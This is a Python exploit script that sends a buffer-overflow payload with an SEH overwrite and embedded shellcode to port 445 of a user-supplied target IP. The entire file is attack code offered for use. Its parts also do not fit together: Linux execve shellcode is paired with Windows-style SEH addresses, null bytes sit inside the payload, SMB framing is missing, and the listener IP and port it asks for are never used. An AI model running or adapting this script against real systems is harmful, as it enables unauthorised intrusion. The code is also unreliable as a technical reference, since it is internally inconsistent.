import socket
import struct

# Function to create the exploit payload
def create_exploit_payload(target_ip, attacker_ip, attacker_port):
    # Create the exploit payload
    exploit_payload = b""
    exploit_payload += b"A" * 2606
    exploit_payload += struct.pack("<L", 0x77e5815b)  # Overwrite the SEH handler
    exploit_payload += struct.pack("<L", 0x77e1d7f3)  # Overwrite the SEH handler
    exploit_payload += b"C" * 20
    exploit_payload += b"\x00\x00"
    exploit_payload += struct.pack("<L", 0x7c9054ea)  # Jump to the shellcode

    # Create the shellcode
    shellcode = b""
    shellcode += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

    return exploit_payload + shellcode

# Function to send the exploit payload
def send_exploit_payload(target_ip, attacker_ip, attacker_port):
    # Create the socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, 445))

    # Send the exploit payload
    payload = create_exploit_payload(target_ip, attacker_ip, attacker_port)
    sock.send(payload)

    # Close the socket
    sock.close()

# Usage example
target_ip = input("RHOST: ")
attacker_ip = input("LHOST: ")
attacker_port = int(input("LPORT: "))

send_exploit_payload(target_ip, attacker_ip, attacker_port)
